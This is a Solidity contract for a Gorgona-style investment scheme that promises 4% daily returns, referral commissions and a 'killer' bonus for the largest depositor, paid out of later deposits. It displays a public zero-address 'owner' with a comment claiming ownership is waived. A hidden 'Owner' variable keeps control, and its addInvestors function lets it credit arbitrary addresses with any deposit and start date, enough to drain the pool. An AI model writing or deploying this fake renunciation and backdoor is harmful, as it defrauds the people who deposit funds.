1 pragma solidity ^0.4.24;
2 
3 contract Abdurahman {
4     address Owner; // create the owner to process some contract settings
5     address public owner = 0x0000000000000000000000000000000000000000; // immediate ownership waiver after contract execution
6     address public adminAddr;
7     uint constant public MASS_TRANSACTION_LIMIT = 150;
8     uint constant public MINIMUM_INVEST = 10000000000000000 wei;
9     uint constant public INTEREST = 4; // Abdurahman
10     uint public depositAmount;
11     uint public round;
12     uint public lastPaymentDate;
13     GorgonaKiller public gorgonaKiller;
14     address[] public addresses;
15     mapping(address => Investor) public investors;
16     bool public pause;
17 
18     struct Investor
19     {
20         uint id;
21         uint deposit;
22         uint deposits;
23         uint date;
24         address referrer;
25     }
26 
27     struct GorgonaKiller
28     {
29         address addr;
30         uint deposit;
31     }
32 
33     event Invest(address addr, uint amount, address referrer);
34     event Payout(address addr, uint amount, string eventType, address from);
35     event NextRoundStarted(uint round, uint date, uint deposit);
36     event GorgonaKillerChanged(address addr, uint deposit);
37 
38     modifier onlyOwner {if (msg.sender == Owner) _;}
39 
40     constructor() public {
41         Owner = msg.sender;
42         adminAddr = msg.sender;
43         addresses.length = 1;
44         round = 1;
45     }
46 
47     function transferOwnership(address addr) onlyOwner public {
48         Owner = addr;
49     }
50 
51     function addInvestors(address[] _addr, uint[] _deposit, uint[] _date, address[] _referrer) onlyOwner public {
52         // add initiated investors
53         for (uint i = 0; i < _addr.length; i++) {
54             uint id = addresses.length;
55             if (investors[_addr[i]].deposit == 0) {
56                 addresses.push(_addr[i]);
57                 depositAmount += _deposit[i];
58             }
59 
60             investors[_addr[i]] = Investor(id, _deposit[i], 1, _date[i], _referrer[i]);
61             emit Invest(_addr[i], _deposit  [i], _referrer[i]);
62 
63             if (investors[_addr[i]].deposit > gorgonaKiller.deposit) {
64                 gorgonaKiller = GorgonaKiller(_addr[i], investors[_addr[i]].deposit);
65             }
66         }
67         lastPaymentDate = now;
68     }
69 
70     function() payable public {
71         if (owner == msg.sender) {
72             return;
73         }
74 
75         if (0 == msg.value) {
76             payoutSelf();
77             return;
78         }
79 
80         require(false == pause, "Gorgona is restarting. Please wait.");
81         require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");
82         Investor storage user = investors[msg.sender];
83 
84         if (user.id == 0) {
85             // ensure that payment not from hacker contract
86             msg.sender.transfer(0 wei);
87             addresses.push(msg.sender);
88             user.id = addresses.length;
89             user.date = now;
90 
91             // referrer
92             address referrer = bytesToAddress(msg.data);
93             if (investors[referrer].deposit > 0 && referrer != msg.sender) {
94                 user.referrer = referrer;
95             }
96         } else {
97             payoutSelf();
98         }
99 
100         // save investor
101         user.deposit += msg.value;
102         user.deposits += 1;
103 
104         emit Invest(msg.sender, msg.value, user.referrer);
105 
106         depositAmount += msg.value;
107         lastPaymentDate = now;
108 
109         // adminAddr.transfer(msg.value / 5); 100% GO TO BANK IN GORGONA PREMIUM
110         uint bonusAmount = (msg.value / 100) * INTEREST; // referrer commission for all deposits
111 
112         if (user.referrer > 0x0) {
113             if (user.referrer.send(bonusAmount)) {
114                 emit Payout(user.referrer, bonusAmount, "referral", msg.sender);
115             }
116 
117             if (user.deposits == 1) { // cashback only for the first deposit
118                 if (msg.sender.send(bonusAmount)) {
119                     emit Payout(msg.sender, bonusAmount, "cash-back", 0);
120                 }
121             }
122         } else if (gorgonaKiller.addr > 0x0) {
123             if (gorgonaKiller.addr.send(bonusAmount)) {
124                 emit Payout(gorgonaKiller.addr, bonusAmount, "killer", msg.sender);
125             }
126         }
127 
128         if (user.deposit > gorgonaKiller.deposit) {
129             gorgonaKiller = GorgonaKiller(msg.sender, user.deposit);
130             emit GorgonaKillerChanged(msg.sender, user.deposit);
131         }
132     }
133 
134     function payout(uint offset) public
135     {
136         if (pause == true) {
137             doRestart();
138             return;
139         }
140 
141         uint txs;
142         uint amount;
143 
144         for (uint idx = addresses.length - offset - 1; idx >= 1 && txs < MASS_TRANSACTION_LIMIT; idx--) {
145             address addr = addresses[idx];
146             if (investors[addr].date + 20 hours > now) {
147                 continue;
148             }
149 
150             amount = getInvestorDividendsAmount(addr);
151             investors[addr].date = now;
152 
153             if (address(this).balance < amount) {
154                 pause = true;
155                 return;
156             }
157 
158             if (addr.send(amount)) {
159                 emit Payout(addr, amount, "bulk-payout", 0);
160             }
161 
162             txs++;
163         }
164     }
165 
166     function payoutSelf() private {
167         require(investors[msg.sender].id > 0, "Investor not found.");
168         uint amount = getInvestorDividendsAmount(msg.sender);
169 
170         investors[msg.sender].date = now;
171         if (address(this).balance < amount) {
172             pause = true;
173             return;
174         }
175 
176         msg.sender.transfer(amount);
177         emit Payout(msg.sender, amount, "self-payout", 0);
178     }
179 
180     function doRestart() private {
181         uint txs;
182         address addr;
183 
184         for (uint i = addresses.length - 1; i > 0; i--) {
185             addr = addresses[i];
186             addresses.length -= 1;
187             delete investors[addr];
188             if (txs++ == MASS_TRANSACTION_LIMIT) {
189                 return;
190             }
191         }
192 
193         emit NextRoundStarted(round, now, depositAmount);
194         pause = false;
195         round += 1;
196         depositAmount = 0;
197         lastPaymentDate = now;
198 
199         delete gorgonaKiller;
200     }
201 
202     function getInvestorCount() public view returns (uint) {
203         return addresses.length - 1;
204     }
205 
206     function getInvestorDividendsAmount(address addr) public view returns (uint) {
207         return investors[addr].deposit / 100 * INTEREST * (now - investors[addr].date) / 1 days;
208     }
209 
210     function bytesToAddress(bytes bys) private pure returns (address addr) {
211         assembly {
212             addr := mload(add(bys, 20))
213         }
214     }
215 }